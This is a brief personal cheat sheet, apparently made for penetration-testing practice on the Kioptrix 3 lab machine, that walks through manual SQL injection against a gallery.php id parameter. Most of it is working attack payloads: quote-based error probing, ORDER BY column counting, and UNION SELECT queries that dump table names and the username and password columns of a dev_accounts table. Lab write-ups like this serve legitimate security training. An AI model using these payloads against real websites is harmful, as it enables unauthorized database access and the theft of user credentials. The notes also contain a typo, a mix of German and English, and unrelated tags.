# How to manually do sqlinjection

## Following steps to exploit sql   (example from kioptrix3)


everywhere where id in request try to append '
id = 1'
-->sql error

find out number of columns 

http://example.com/gallery/gallery.php?id=1 order by **1**-- -> works
http://example.com/gallery/gallery.php?id=1 order by **2**-- -> works
http://example.com/gallery/gallery.php?id=1 order by **3**-- -> works
http://example.com/gallery/gallery.php?id=1 order by **4**-- -> works

http://example.com/gallery/gallery.php?id=1 order by **5**-- -> works
http://example.com/gallery/gallery.php?id=1 order by **6**-- -> works

http://example.com/gallery/gallery.php?id=1 order by **7**-- --> ERROR

----> N-1 --> 7 -1 = 6 Columns


Finding Accessible Columns
http://example.com/gallery/gallery.php?id=-1 union all select **1,2,3,4,5,6**--
2
3


zahl 2 und 3 --> Vulnerable Stelle 2 und 3 --> group concat an 2 oder 3. stelle

http://kioptrix.com/gallery/gallery.php?id=-1 union select 1,2,databases(),4,5,6--



http://example.com/gallery/gallery.php?id=-1 union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()--

dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users

http://example.com/gallery/gallery.php?id=-1%20union%20select%201,2,group_concat(table_name),4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--




http://example.com/gallery/gallery.php?id=-1 union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--

id,username,password

```

tags: #wget #ftp #linux 
